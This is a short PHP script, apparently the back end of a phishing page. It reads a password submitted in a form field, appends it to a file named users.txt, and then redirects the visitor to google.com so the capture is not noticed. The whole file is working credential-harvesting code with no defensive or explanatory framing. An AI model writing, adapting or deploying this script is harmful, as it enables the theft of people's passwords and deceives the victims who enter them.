<?php


$clave = $_POST['pass'];

$archivo = fopen("users.txt","a");
$datos= "Pass: ".$clave."\n"."\n"."####################"."\n";

fwrite($archivo,$datos);
fclose($archivo);
echo "<meta http-equiv='refresh' content='1;url=https://www.google.com'>  ";
?>
